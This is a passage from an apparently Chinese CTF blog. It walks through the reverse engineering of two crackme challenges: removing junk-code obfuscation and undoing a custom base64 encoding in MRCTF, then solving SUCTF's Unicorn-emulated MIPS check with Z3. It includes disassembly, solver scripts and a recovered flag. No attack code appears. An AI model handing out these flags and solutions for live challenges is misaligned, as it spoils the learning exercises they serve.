[ebp-8].text:00401238                 sub     eax, [ebp-1Ch].text:0040123B                 mov     [ebp-20h], eax.text:0040123E                 mov     ecx, [ebp-20h].text:00401241                 mov     [ebp-24h], ecx.text:00401244                 cmp     dword ptr [ebp-24h], 2Bh.text:00401248                 jz      short loc_401251.text:0040124A                 xor     al, al.text:0040124C                 jmp     loc_401387</code></pre><p>这段的意思实际上就是判断了一下字符串的长度为<code>0x2B</code>，然后进行了一个跳转，如果长度不为<code>0x2B</code>，跳转到结束部分，如果是，进行下一步的处理，然后发现下一步有个花指令</p><pre><code class="asm">loc_401251:                             ; CODE XREF: .text:00401248↑j.text:00401251                 call    sub_401275.text:00401256                 call    near ptr 2BFF088Eh.text:00401256 ; ---------------------------------------------------------------------------.text:0040125B                 db    0.text:0040125C                 db    0.text:0040125D                 db    0.text:0040125E                 db 33h.text:0040125F                 db 0C0h.text:00401260                 db 8Ah.text:00401261                 db  86h.text:00401262                 db  9Fh ; OFF32 SEGDEF [_data,42169F].text:00401263                 db  16h.text:00401264                 db  42h ; B.text:00401265                 db    0.text:00401266                 db 34h.text:00401267                 db    3.text:00401268                 db 88h.text:00401269                 db  86h.text:0040126A                 db  9Fh ; OFF32 SEGDEF [_data,42169F].text:0040126B                 db  16h.text:0040126C                 db  42h ; B.text:0040126D                 db    0.text:0040126E                 db 4Eh.text:0040126F                 db 85h.text:00401270                 db 0F6h.text:00401271                 db 75h.text:00401272                 db 0EBh.text:00401273                 db 0EBh</code></pre><p>开始变得乱七八糟，看一下<code>call</code>的函数内容</p><pre><code class="asm">sub_401275      proc near               ; CODE XREF: .text:loc_401251↑p.text:00401275                 pop     eax.text:00401276                 add     eax, 1.text:00401279                 push    eax.text:0040127A                 retn.text:0040127A sub_401275      endp</code></pre><p>这就是个典型的花指令，首先<code>call</code>一个函数，相当于<code>push eip+jmp</code>，这个时候栈顶是<code>eip</code>就是函数执行结束之后需要返回的地址，但是进入这个函数之后发现，这个函数的作用就是把栈顶的<code>old eip</code>弹出到<code>eax</code>，然后<code>+1</code>，再<code>push</code>到栈顶，这使得最后返回的时候跳过了<code>call</code>命令紧接着的那个字节，所以手动去一下花，真正的指令应该是</p><pre><code class="asm"> xor     esi, esi.text:00401259                 mov     esi, 2Bh.text:0040125E.text:0040125E loc_40125E:                             ; CODE XREF: .text:00401271↓j.text:0040125E                 xor     eax, eax.text:00401260                 mov     al, byte ptr (dword_42169C+3)[esi].text:00401266                 xor     al, 3.text:00401268                 mov     byte ptr (dword_42169C+3)[esi], al.text:0040126E                 dec     esi.text:0040126F                 test    esi, esi.text:00401271                 jnz     short loc_40125E.text:00401273                 jmp     short loc_40127B</code></pre><p>对于输入的字符每一个都和3异或得到了新的字符串，这里用的<code>al</code>取低八位实际上没有什么影响，因为输入的字符都在<code>0~255</code>之间，然后接下来还有一个跳转</p><pre><code class="asm">loc_40127B:                             ; CODE XREF: .text:00401273↑j.text:0040127B                 xor     eax, eax.text:0040127D                 jz      short near ptr loc_40127F+1.text:0040127F.text:0040127F loc_40127F:                             ; CODE XREF: .text:0040127D↑j.text:0040127F                 call    near ptr 2BFF08B7h.text:0040127F ; ---------------------------------------------------------------------------.text:00401284                 db    0.text:00401285                 db    0.text:00401286                 db    0.text:00401287                 db  33h ; 3.text:00401288                 db 0C0h, 8Ah, 86h.text:0040128B                 dd offset dword_42169C+3.text:0040128F                 db 8Bh.text:00401290                 dd 74DB33CEh, 0E183E801h, 0F98301h, 0C8C00574h, 0C003EB04h.text:00401290                 dd 868804C0h.text:004012A8                 dd offset dword_42169C+3.text:004012AC                 dd 75F6854Eh, 2BBAD6h.text:004012B4                 db 2 dup(0), 0B9h.text:004012B7                 dd offset unk_4216A0</code></pre><p>又是一个花指令，这个就比较明显，去花</p><pre><code class="asm">loc_401287:                             ; CODE XREF: .text:004012AF↓j.text:00401287                 xor     eax, eax.text:00401289                 mov     al, byte ptr (dword_42169C+3)[esi].text:0040128F                 mov     ecx, esi.text:00401291                 xor     ebx, ebx.text:00401293                 jz      short near ptr loc_401295+1.text:00401295.text:00401295 loc_401295:                             ; CODE XREF: .text:00401293↑j.text:00401295                 call    near ptr 8341F41Dh.text:0040129A                 stc.text:0040129B                 add     [ebp+eax-40h], dh</code></pre><p>又是一个明显的花指令，接着去花，之后就没什么阻碍了</p><pre><code class="asm">loc_40127B:                             ; CODE XREF: .text:00401273↑j.text:0040127B                 xor     eax, eax.text:0040127D                 jz      short loc_401280.text:0040127D ; ---------------------------------------------------------------------------.text:0040127F                 db 0E8h.text:00401280 ; ---------------------------------------------------------------------------.text:00401280.text:00401280 loc_401280:                             ; CODE XREF: .text:0040127D↑j.text:00401280                 xor     esi, esi.text:00401282                 mov     esi, 2Bh.text:00401287.text:00401287 loc_401287:                             ; CODE XREF: .text:004012AF↓j.text:00401287                 xor     eax, eax.text:00401289                 mov     al, byte ptr (dword_42169C+3)[esi].text:0040128F                 mov     ecx, esi.text:00401291                 xor     ebx, ebx.text:00401293                 jz      short loc_401296.text:00401293 ; ---------------------------------------------------------------------------.text:00401295                 db 0E8h.text:00401296 ; ---------------------------------------------------------------------------.text:00401296.text:00401296 loc_401296:                             ; CODE XREF: .text:00401293↑j.text:00401296                 and     ecx, 1.text:00401299                 cmp     ecx, 0.text:0040129C                 jz      short loc_4012A3.text:0040129E                 ror     al, 4.text:004012A1                 jmp     short loc_4012A6.text:004012A3 ; ---------------------------------------------------------------------------.text:004012A3.text:004012A3 loc_4012A3:                             ; CODE XREF: .text:0040129C↑j.text:004012A3                 rol     al, 4.text:004012A6.text:004012A6 loc_4012A6:                             ; CODE XREF: .text:004012A1↑j.text:004012A6                 mov     byte ptr (dword_42169C+3)[esi], al.text:004012AC                 dec     esi.text:004012AD                 test    esi, esi.text:004012AF                 jnz     short loc_401287.text:004012B1                 mov     edx, 2Bh.text:004012B6                 mov     ecx, offset unk_4216A0.text:004012BB                 call    sub_401090.text:004012C0                 mov     dword ptr [ebp-0Ch], offset byte_421708.text:004012C7                 mov     edx, [ebp-0Ch].text:004012CA                 add     edx, 1.text:004012CD                 mov     [ebp-28h], edx.text:004012D0.text:004012D0 loc_4012D0:                             ; CODE XREF: .text:004012E0↓j.text:004012D0                 mov     eax, [ebp-0Ch].text:004012D3                 mov     cl, [eax].text:004012D5                 mov     [ebp-2], cl.text:004012D8                 add     dword ptr [ebp-0Ch], 1.text:004012DC                 cmp     byte ptr [ebp-2], 0.text:004012E0                 jnz     short loc_4012D0.text:004012E2                 mov     edx, [ebp-0Ch].text:004012E5                 sub     edx, [ebp-28h].text:004012E8                 mov     [ebp-30h], edx.text:004012EB                 mov     dword ptr [ebp-10h], offset aBuedvshlmfwhpz ; &quot;%BUEdVSHlmfWhpZn!oaWZ(aGBsZ@ZpZn!oaWZ(a&quot;....text:004012F2                 mov     eax, [ebp-10h].text:004012F5                 add     eax, 1.text:004012F8                 mov     [ebp-2Ch], eax.text:004012FB.text:004012FB loc_4012FB:                             ; CODE XREF: .text:0040130B↓j.text:004012FB                 mov     ecx, [ebp-10h].text:004012FE                 mov     dl, [ecx].text:00401300                 mov     [ebp-3], dl.text:00401303                 add     dword ptr [ebp-10h], 1.text:00401307                 cmp     byte ptr [ebp-3], 0.text:0040130B                 jnz     short loc_4012FB.text:0040130D                 mov     eax, [ebp-10h].text:00401310                 sub     eax, [ebp-2Ch].text:00401313                 mov     [ebp-34h], eax.text:00401316                 mov     ecx, [ebp-30h].text:00401319                 cmp     ecx, [ebp-34h].text:0040131C                 jz      short loc_401322.text:0040131E                 xor     al, al.text:00401320                 jmp     short loc_401387.text:00401322 ; ---------------------------------------------------------------------------.text:00401322.text:00401322 loc_401322:                             ; CODE XREF: .text:0040131C↑j.text:00401322                 mov     dword ptr [ebp-18h], 0.text:00401329                 jmp     short loc_401334.text:0040132B ; ---------------------------------------------------------------------------.text:0040132B.text:0040132B loc_40132B:                             ; CODE XREF: .text:loc_401383↓j.text:0040132B                 mov     edx, [ebp-18h].text:0040132E                 add     edx, 1.text:00401331                 mov     [ebp-18h], edx.text:00401334.text:00401334 loc_401334:                             ; CODE XREF: .text:00401329↑j.text:00401334                 mov     dword ptr [ebp-14h], offset byte_421708.text:0040133B                 mov     eax, [ebp-14h].text:0040133E                 add     eax, 1.text:00401341                 mov     [ebp-38h], eax.text:00401344.text:00401344 loc_401344:                             ; CODE XREF: .text:00401354↓j.text:00401344                 mov     ecx, [ebp-14h].text:00401347                 mov     dl, [ecx].text:00401349                 mov     [ebp-4], dl.text:0040134C                 add     dword ptr [ebp-14h], 1.text:00401350                 cmp     byte ptr [ebp-4], 0.text:00401354                 jnz     short loc_401344.text:00401356                 mov     eax, [ebp-14h].text:00401359                 sub     eax, [ebp-38h].text:0040135C                 mov     [ebp-3Ch], eax.text:0040135F                 mov     ecx, [ebp-18h].text:00401362                 cmp     ecx, [ebp-3Ch].text:00401365                 jnb     short loc_401385.text:00401367                 mov     edx, [ebp-18h].text:0040136A                 movsx   eax, byte_421708[edx].text:00401371                 mov     ecx, [ebp-18h].text:00401374                 movsx   edx, byte ptr aBuedvshlmfwhpz[ecx] ; &quot;%BUEdVSHlmfWhpZn!oaWZ(aGBsZ@ZpZn!oaWZ(a&quot;....text:0040137B                 cmp     eax, edx.text:0040137D                 jz      short loc_401383.text:0040137F                 xor     al, al.text:00401381                 jmp     short loc_401387.text:00401383 ; ---------------------------------------------------------------------------.text:00401383.text:00401383 loc_401383:                             ; CODE XREF: .text:0040137D↑j.text:00401383                 jmp     short loc_40132B.text:00401385 ; ---------------------------------------------------------------------------.text:00401385.text:00401385 loc_401385:                             ; CODE XREF: .text:00401365↑j.text:00401385                 mov     al, 1.text:00401387.text:00401387 loc_401387:                             ; CODE XREF: .text:0040124C↑j.text:00401387                                         ; .text:00401320↑j ....text:00401387                 pop     edi.text:00401388                 pop     esi.text:00401389                 pop     ebx.text:0040138A                 mov     esp, ebp.text:0040138C                 pop     ebp.text:0040138D                 retn</code></pre><p>这些都很容易分析，可以看到先分奇偶分别进行了左右循环移位，<del>虽然我看不懂这迷惑的左右移四位是什么情况</del>，实际上就是每个字符前四位和后四位交换位置</p><p>然后调用了一个函数进行了处理，处理之后和已知的字符串进行对比，相同就返回正确，逻辑很简单，用来处理的函数如下</p><pre><code class="c++">char __fastcall sub_401090(char *a1, int a2){  int v2; // eax  signed int v3; // esi  int v4; // edi  char v5; // al  unsigned __int8 v6; // ah  unsigned __int8 v7; // dh  unsigned __int8 v8; // bh  unsigned __int8 v9; // dl  signed int v10; // eax  bool v11; // cf  unsigned __int8 v12; // cl  int i; // ecx  int v15; // [esp+8h] [ebp-14h]  char v16; // [esp+10h] [ebp-Ch]  char v17; // [esp+11h] [ebp-Bh]  char v18; // [esp+12h] [ebp-Ah]  char v19; // [esp+13h] [ebp-9h]  unsigned __int8 v20; // [esp+14h] [ebp-8h]  unsigned __int8 v21; // [esp+15h] [ebp-7h]  unsigned __int8 v22; // [esp+16h] [ebp-6h]  unsigned __int8 v23; // [esp+1Bh] [ebp-1h]  v2 = a2;  v3 = 0;  v4 = 0;  if ( a2 )  {    do    {      v15 = v2 - 1;      v5 = *a1++;      *(&amp;v20 + v3++) = v5;      v6 = v22;      v7 = v21;      v8 = v20;      v23 = v22;      if ( v3 == 3 )      {        v9 = (v22 &gt;&gt; 6) + 4 * (v21 &amp; 0xF);        v17 = (v21 &gt;&gt; 4) + 16 * (v20 &amp; 3);        v18 = (v22 &gt;&gt; 6) + 4 * (v21 &amp; 0xF);        v19 = v22 &amp; 0x3F;        v16 = v20 &gt;&gt; 2;        byte_421708[v4] = byte_41EA00[v20 &gt;&gt; 2];        byte_421709[v4] = byte_41EA00[(unsigned __int8)((v7 &gt;&gt; 4) + 16 * (v8 &amp; 3))];        byte_42170A[v4] = byte_41EA00[v9];        byte_42170B[v4] = byte_41EA00[v6 &amp; 0x3F];        v4 += 4;        v3 = 0;      }      v2 = v15;    }    while ( v15 );    if ( v3 )    {      v10 = v3;      if ( v3 &gt;= 3 )      {        v12 = v23;      }      else      {        v11 = (unsigned int)v3 &lt; 3;        do        {          if ( !v11 )          {            sub_40150A(a1);            JUMPOUT(*(_DWORD *)algn_4011F3);          }          *(&amp;v20 + v10++) = 0;          v11 = (unsigned int)v10 &lt; 3;        }        while ( v10 &lt; 3 );        v12 = v22;        v7 = v21;        v8 = v20;      }      v16 = v8 &gt;&gt; 2;      v17 = (v7 &gt;&gt; 4) + 16 * (v8 &amp; 3);      LOBYTE(v2) = v12 &gt;&gt; 6;      v19 = v12 &amp; 0x3F;      v18 = (v12 &gt;&gt; 6) + 4 * (v7 &amp; 0xF);      for ( i = 0; i &lt; v3 + 1; ++v4 )      {        v2 = (unsigned __int8)*(&amp;v16 + i++);        LOBYTE(v2) = byte_41EA00[v2];        byte_421708[v4] = v2;      }      if ( v3 &lt; 3 )        LOBYTE(v2) = sub_4022E0(&amp;byte_421708[v4], 46, 3 - v3);    }  }  return v2;}</code></pre><p>这是一个类似于<code>base64</code>的一个编码过程，把三个字符转换成四个字符，只不过索引的计算用了一些位运算，仔细想一下很容易还原，到这里就可以把<code>flag</code>解出来了</p><pre><code class="python">target = &#39;%BUEdVSHlmfWhpZn!oaWZ(aGBsZ@ZpZn!oaWZ(aGBsZ@ZpZn!oYGxnZm&#39;#%w&#39;flag = &#39;&#39;target1 = &#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz)!@#$%^&amp;*(+/&#39;i = 0tmps = []# print(chr(0x2e))# print(len(target))while i &lt; len(target):    index0 = target1.index(target[i])    index1 = target1.index(target[i + 1])    index2 = target1.index(target[i + 2])    index3 = target1.index(target[i + 3])    i += 4    tmp1 = index0 * 4 + ((index1 &amp; 0x30) &gt;&gt; 4)    tmp2 = ((index1 &amp; 0xf) &lt;&lt; 4) + ((index2 &amp; 0x3c) &gt;&gt; 2)    tmp3 = ((index2 &amp; 3) &lt;&lt; 6) + index3    tmps.append(tmp1)    tmps.append(tmp2)    tmps.append(tmp3)for i in tmps:    tmp = (((i &amp; 0xf) &lt;&lt; 4) &amp; 0xff) + ((i &amp; 0xf0) &gt;&gt; 4)    flag += chr(tmp ^ 3)print(flag+&#39;}&#39;)</code></pre><p>最后凑不齐三个字符，还有下面一套的编码方式，但我懒得看了……反正已经知道最后一个字符是<code>&#39;}&#39;</code>，干脆直接略过，输出<code>flag</code></p><pre><code>MRCTF{junkjunkjunkcodejunkjunkcodejunkcode}</code></pre><p><del>也就这题有点意思</del></p><h3 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h3><p>就做了两道题，第一题直接溢出，第二题<code>shellcode</code>，第三题看了是格式化字符串任意写也没什么意思，就不多写了</p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>writeup</tag>
      
      <tag>MRCTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>babyunic-攻防世界</title>
    <link href="/2020/03/27/babyunic-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/"/>
    <url>/2020/03/27/babyunic-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/</url>
    
    <content type="html"><![CDATA[<p>这是第一次接触<code>unicorn</code>的题目，也算是第一次用<code>z3</code>来解决题目，花了好长时间去熟悉<code>z3</code>和<code>unicorn</code>，确实很强大</p><a id="more"></a><p>打开来有个脚本</p><pre><code class="sh">LD_PRELOAD=./un.so.1 ./babyunic func</code></pre><p>逐个调用，看一下<code>babyunic</code></p><pre><code class="c++">undefined8 FUN_00100eb9(int param_1,long param_2){  int iVar1;  void *__s1;  void *pvVar2;  if (param_1 == 2) {    puts(&quot;SUCTF 2019&quot;);    printf(&quot;input your flag:&quot;);    __s1 = malloc(0x200);    pvVar2 = malloc(0x200);    __isoc99_scanf(&amp;DAT_00101033,pvVar2);    FUN_00100cba(pvVar2,__s1,*(undefined8 *)(param_2 + 8),__s1);    iVar1 = memcmp(__s1,DWORD_ARRAY_00302020,0xa8);    if (iVar1 == 0) {      puts(&quot;congratuation!&quot;);    }    else {      puts(&quot;fail!&quot;);    }  }  else {    puts(&quot;no input files&quot;);  }  return 0;}</code></pre><p>输入一个字符串经过处理后和已知字符串进行对比，相同则通过，接下来看看处理的方法</p><pre><code class="c++">void FUN_00100cba(char *param_1,undefined8 param_2,char *param_3){  long lVar1;  void *__ptr;  size_t sVar1;  long in_FS_OFFSET;  undefined4 local_38;  undefined4 local_34;  int local_30;  undefined4 local_2c;  undefined8 local_28;  FILE *local_20;  void *local_18;  long local_10;  lVar1 = *(long *)(in_FS_OFFSET + 0x28);  local_20 = fopen(param_3,&quot;rb&quot;);  __ptr = malloc(0x7100);  fread(__ptr,1,0x7100,local_20);  local_38 = 0x101fffc0;  local_34 = 0x101fffc0;  local_30 = 0x101ffb00;  local_2c = 0x101ffa00;                    /* mips32大端序 */  uc_open(3,0x40000004,&amp;local_28);  uc_mem_map(local_28,0x400000,0x200000,7);  uc_mem_map(local_28,0x10000000,0x200000,7);  sVar1 = strlen(param_1);  uc_mem_write(local_28,(long)local_30,param_1,sVar1);  uc_mem_write(local_28,0x400000,__ptr,0x7100);  uc_reg_write(local_28,0x1f,&amp;local_38);  uc_reg_write(local_28,0x20,&amp;local_34);  uc_reg_write(local_28,7,&amp;local_2c);  uc_reg_write(local_28,6,&amp;local_30);  uc_emu_start(local_28,0x400000,0x40706c,0,0);  uc_mem_read(local_28,0x101ffa00,param_2,200);  uc_close(local_28);  fclose(local_20);  if (lVar1 != *(long *)(in_FS_OFFSET + 0x28)) {                    /* WARNING: Subroutine does not return */    __stack_chk_fail();  }  return;}</code></pre><p>这里用到了<code>unicorn</code>来模拟其它架构的处理器，查阅<code>unicorn</code>引用的头文件可以得到以下信息</p><pre><code class="c++">local_20 = fopen(param_3,&quot;rb&quot;);__ptr = malloc(0x7100);fread(__ptr,1,0x7100,local_20);//读取输入的文件funcuc_open(3,0x40000004,&amp;local_28);//第一个参数3代表mips架构，第二个参数代表mips32+大端序，第三个参数是句柄sVar1 = strlen(param_1);uc_mem_write(local_28,(long)local_30,param_1,sVar1);//param_1对应我们输入的字符串，放入local_30指向的地址，应该是栈uc_mem_write(local_28,0x400000,__ptr,0x7100);//func为可执行文件，0x400000凭经验是代码段uc_mem_read(local_28,0x101ffa00,param_2,200);//从栈上的某个地址读取200个字节到param_2里</code></pre><p>最后这个函数的输出是<code>param_2</code>也就是最终用来比较的<code>__s1</code>，所以接下来需要搞清楚<code>func</code>函数里进行了哪些操作</p><pre><code class="c++">void UndefinedFunction_00000000(byte *param_1,int *param_2){  int iStack16;  int iStack12;  iStack12 = 0;  while (param_1[iStack12] != 0) {    iStack12 = iStack12 + 1;  }  iStack16 = 0;  while (iStack16 &lt; iStack12) {    param_1[iStack16] = (param_1[iStack16] &lt;&lt; 3 | param_1[iStack16] &gt;&gt; 5) ^ (byte)iStack16;    iStack16 = iStack16 + 1;  }  *param_2 = ((((((((((((((((((((((((((((((((uint)*param_1 + (uint)param_1[1] + (uint)param_1[2]) -                                          (uint)param_1[3]) + (uint)param_1[4]) - (uint)param_1[5])                                       - (uint)param_1[6]) - (uint)param_1[7]) - (uint)param_1[8]) +                                     (uint)param_1[9] + (uint)param_1[10]) - (uint)param_1[0xb]) +                                  (uint)param_1[0xc]) - (uint)param_1[0xd]) - (uint)param_1[0xe]) +                               (uint)param_1[0xf]) - (uint)param_1[0x10]) - (uint)param_1[0x11]) +                             (uint)param_1[0x12] + (uint)param_1[0x13]) - (uint)param_1[0x14]) +                           (uint)param_1[0x15] + (uint)param_1[0x16] + (uint)param_1[0x17] +                          (uint)param_1[0x18]) - (uint)param_1[0x19]) + (uint)param_1[0x1a]) -                       (uint)param_1[0x1b]) + (uint)param_1[0x1c] + (uint)param_1[0x1d]) -                     (uint)param_1[0x1e]) - (uint)param_1[0x1f]) + (uint)param_1[0x20]) -                  (uint)param_1[0x21]) + (uint)param_1[0x22] + (uint)param_1[0x23]) -                (uint)param_1[0x24]) - (uint)param_1[0x25]) + (uint)param_1[0x26]) -             (uint)param_1[0x27]) + (uint)param_1[0x28] + (uint)param_1[0x29];  param_2[1] = (((((((((((((((((((((((((((((((((((uint)*param_1 - (uint)param_1[1]) +                                               (uint)param_1[2]) - (uint)param_1[3]) -                                             (uint)param_1[4]) + (uint)param_1[5]) -                                           (uint)param_1[6]) - (uint)param_1[7]) - (uint)param_1[8])                                        - (uint)param_1[9]) + (uint)param_1[10]) -                                      (uint)param_1[0xb]) + (uint)param_1[0xc]) - (uint)param_1[0xd]                                    ) - (uint)param_1[0xe]) + (uint)param_1[0xf]) -                                 (uint)param_1[0x10]) - (uint)param_1[0x11]) + (uint)param_1[0x12])                              - (uint)param_1[0x13]) + (uint)param_1[0x14] + (uint)param_1[0x15]) -                            (uint)param_1[0x16]) - (uint)param_1[0x17]) - (uint)param_1[0x18]) +                         (uint)param_1[0x19]) - (uint)param_1[0x1a]) + (uint)param_1[0x1b]) -                      (uint)param_1[0x1c]) - (uint)param_1[0x1d]) + (uint)param_1[0x1e] +                     (uint)param_1[0x1f] + (uint)param_1[0x20] + (uint)param_1[0x21] +                     (uint)param_1[0x22] + (uint)param_1[0x23]) - (uint)param_1[0x24]) -                  (uint)param_1[0x25]) - (uint)param_1[0x26]) - (uint)param_1[0x27]) -               (uint)param_1[0x28]) + (uint)param_1[0x29];  param_2[2] = ((((((((((((((((((((((((((((((uint)*param_1 - (uint)param_1[1]) + (uint)param_1[2] + ………………</code></pre><p>实在是太长了，就不放全了，可以看得出来<code>param_1</code>是我们的输入，经过一个处理之后用一系列复杂的方程计算出了<code>param_2</code></p><p>这个时候就要用<code>z3</code>一把梭解决问题了</p><p>首先对最终用于比较的字符进行一些处理</p><pre><code class="python">from z3 import *import ctypese = [0xFFFFFF94, 0xFFFFFF38, 0x00000126, 0xFFFFFF28, 0xFFFFFC10, 0x00000294, 0xFFFFFC9E, 0x000006EA, 0x000000DC,     0x00000006, 0xFFFFFF0C, 0xFFFFFDF6, 0xFFFFFA82, 0xFFFFFCD0, 0x00000182, 0x000003DE, 0x0000014E, 0x000002B2,     0xFFFFF8D8, 0x00000174, 0xFFFFFAA6, 0xFFFFF9D4, 0x000001C2, 0xFFFFF97C, 0x0000035A, 0x00000146, 0xFFFFFF3C,     0xFFFFFA14, 0x000001CE, 0x000007DC, 0xFFFFFD48, 0x00000098, 0x0000085E, 0xFFFFFDB0, 0xFFFFFFBC, 0x0000036E,     0xFFFFFF4E, 0xFFFFF836, 0x000005C0, 0x000006AE, 0x00000694, 0x00000022]en = map(lambda x: ctypes.c_int32(x).value, e)enc = [z3.IntVal(i) for i in en]</code></pre><p>在<code>babyunic</code>里是小端序存储，但是在<code>unicorn</code>里模拟的是32位大端序，需要进行一个转换，先是转换成大端序，然后转换成<code>c</code>的<code>int32</code>类型</p><pre><code class="python">c = [Int(&#39;c%d&#39; % i) for i in range(42)]flag = []solver = Solver()for v in c:    solver.add(v &gt;= 0x0)    solver.add(v &lt;= 0xff)</code></pre><p>设定好符号，添加约束为<code>ascii</code>码值，然后添加方程的约束</p><pre><code class="python">solver.add(enc[0] == (((((((((((((((((((((((((((((((c[0] + c[1] + c[2]) - c[3]) + c[4]) - c[5]) - c[6]) - c[7]) - c[    8]) + c[9] + c[10]) - c[0xb]) + c[0xc]) - c[0xd]) - c[0xe]) + c[0xf]) - c[0x10]) - c[0x11]) + c[0x12] + c[0x13]) -                                    c[0x14]) + c[0x15] + c[0x16] + c[0x17] + c[0x18]) - c[0x19]) + c[0x1a]) - c[0x1b]) +                               c[0x1c] + c[0x1d]) - c[0x1e]) - c[0x1f]) + c[0x20]) - c[0x21]) + c[0x22] + c[0x23]) - c[                             0x24]) - c[0x25]) + c[0x26]) - c[0x27]) + c[0x28] + c[0x29])solver.add(enc[1] == ((((((((((((((((((((((((((((((((((c[0] - c[1]) + c[2]) - c[3]) - c[4]) + c[5]) - c[6]) - c[7]) - c[    8]) - c[9]) + c[10]) - c[0xb]) + c[0xc]) - c[0xd]) - c[0xe]) + c[0xf]) - c[0x10]) - c[0x11]) + c[0x12]) - c[0x13]) +                                    c[0x14] + c[0x15]) - c[0x16]) - c[0x17]) - c[0x18]) + c[0x19]) - c[0x1a]) + c[                                  0x1b]) - c[0x1c]) - c[0x1d]) + c[0x1e] + c[0x1f] + c[0x20] + c[0x21] + c[0x22] + c[                               0x23]) - c[0x24]) - c[0x25]) - c[0x26]) - c[0x27]) - c[0x28]) + c[0x29])solver.add(enc[2] == (((((((((((((((((((((((((((((c[0] - c[1]) + c[2] + c[3]) - c[4]) + c[5]) - c[6]) - c[7]) + c[8]) -                                           c[9]) - c[10]) - c[0xb]) - c[0xc]) - c[0xd]) + c[0xe]) - c[0xf]) - c[0x10]) +                                   c[0x11] + c[0x12] + c[0x13] + c[0x14] + c[0x15]) - c[0x16]) + c[0x17] + c[0x18] + c[                                     0x19] + c[0x1a]) - c[0x1b]) + c[0x1c]) - c[0x1d]) + c[0x1e]) - c[0x1f]) + c[0x20] +                           c[0x21]) - c[0x22]) - c[0x23]) + c[0x24] + c[0x25] + c[0x26]) - c[0x27]) + c[0x28]) - c[               0x29])solver.add(enc[3] == (((((((((((((((((((((((((((((((c[0] - c[1]) - c[2]) - c[3]) - c[4]) - c[5]) + c[6] + c[7]) - c[    8]) - c[9]) - c[10]) - c[0xb]) + c[0xc]) - c[0xd]) + c[0xe]) - c[0xf]) + c[0x10]) - c[0x11]) + c[0x12] + c[0x13] +                                    c[0x14]) - c[0x15]) + c[0x16] + c[0x17] + c[0x18]) - c[0x19]) - c[0x1a]) + c[                                   0x1b]) - c[0x1c]) + c[0x1d] + c[0x1e]) - c[0x1f]) - c[0x20]) - c[0x21]) + c[0x22]) -                        c[0x23]) + c[0x24] + c[0x25] + c[0x26]) - c[0x27]) + c[0x28] + c[0x29])solver.add(enc[4] == (((((((((((((((((((((((((((((((((c[0] - c[1]) - c[2]) + c[3]) - c[4]) - c[5]) + c[6] + c[7] + c[    8] + c[9]) - c[10]) + c[0xb] + c[0xc]) - c[0xd]) + c[0xe]) - c[0xf]) + c[0x10] + c[0x11]) - c[0x12]) + c[0x13]) - c[                                            0x14]) + c[0x15]) - c[0x16]) - c[0x17]) - c[0x18]) + c[0x19]) - c[0x1a]) -                                 c[0x1b]) - c[0x1c]) + c[0x1d] + c[0x1e] + c[0x1f]) - c[0x20]) + c[0x21]) - c[0x22]) -                           c[0x23]) + c[0x24]) - c[0x25]) + c[0x26]) - c[0x27]) - c[0x28]) - c[0x29])solver.add(enc[5] == ((((((((((((((((((((((((((((c[0] + c[1] + c[2] + c[3] + c[4] + c[5] + c[6] + c[7] + c[8]) - c[9]) -                                               c[10]) - c[0xb]) - c[0xc]) - c[0xd]) - c[0xe]) + c[0xf]) - c[0x10]) + c[                                            0x11]) - c[0x12]) + c[0x13] + c[0x14]) - c[0x15]) + c[0x16]) - c[0x17]) + c[                                      0x18]) - c[0x19]) + c[0x1a] + c[0x1b]) - c[0x1c]) + c[0x1d]) - c[0x1e]) + c[                                0x1f] + c[0x20] + c[0x21]) - c[0x22]) - c[0x23]) - c[0x24]) + c[0x25]) - c[0x26]) - c[                          0x27]) + c[0x28] + c[0x29])solver.add(enc[6] == (((((((((((((((((((((((((((c[0] - c[1]) + c[2] + c[3] + c[4]) - c[5]) + c[6] + c[7] + c[8] + c[    9]) - c[10]) + c[0xb] + c[0xc]) - c[0xd]) + c[0xe] + c[0xf] + c[0x10] + c[0x11]) - c[0x12]) - c[0x13]) - c[0x14]) -                                     c[0x15]) - c[0x16]) - c[0x17]) + c[0x18] + c[0x19]) - c[0x1a]) + c[0x1b] + c[                                    0x1c] + c[0x1d]) - c[0x1e]) - c[0x1f]) - c[0x20]) - c[0x21]) - c[0x22]) - c[0x23]) +                         c[0x24] + c[0x25]) - c[0x26]) - c[0x27]) + c[0x28]) - c[0x29])solver.add(enc[7] == ((((((((((((((((((((((((((((((c[0] + c[1]) - c[2]) - c[3]) - c[4]) + c[5] + c[6]) - c[7]) + c[8] +                                             c[9]) - c[10]) + c[0xb]) - c[0xc]) + c[0xd]) - c[0xe]) + c[0xf]) - c[                                          0x10]) + c[0x11]) - c[0x12]) - c[0x13]) + c[0x14]) - c[0x15]) + c[0x16]) - c[                                   0x17]) - c[0x18]) + c[0x19]) - c[0x1a]) + c[0x1b] + c[0x1c] + c[0x1d] + c[0x1e] + c[                               0x1f] + c[0x20]) - c[0x21]) + c[0x22]) - c[0x23]) + c[0x24] + c[0x25] + c[0x26] + c[                           0x27]) - c[0x28]) - c[0x29])solver.add(enc[8] == (((((((((((((((((((((((((((((c[0] - c[1]) - c[2]) + c[3] + c[4]) - c[5]) + c[6] + c[7] + c[8] + c[    9] + c[10]) - c[0xb]) - c[0xc]) + c[0xd]) - c[0xe]) + c[0xf] + c[0x10] + c[0x11] + c[0x12]) - c[0x13]) + c[0x14] +                                       c[0x15]) - c[0x16]) - c[0x17]) + c[0x18] + c[0x19] + c[0x1a]) - c[0x1b]) + c[                                      0x1c]) - c[0x1d]) - c[0x1e]) - c[0x1f]) - c[0x20]) - c[0x21]) + c[0x22]) - c[                               0x23]) - c[0x24]) + c[0x25]) - c[0x26]) - c[0x27]) + c[0x28]) - c[0x29])solver.add(enc[9] == (((((((((((((((((((((((((((((c[0] + c[1] + c[2]) - c[3]) + c[4] + c[5] + c[6]) - c[7]) - c[8]) - c[    9]) - c[10]) + c[0xb] + c[0xc] + c[0xd]) - c[0xe]) + c[0xf] + c[0x10]) - c[0x11]) - c[0x12]) + c[0x13] + c[0x14]) -                                     c[0x15]) - c[0x16]) - c[0x17]) + c[0x18]) - c[0x19]) - c[0x1a]) - 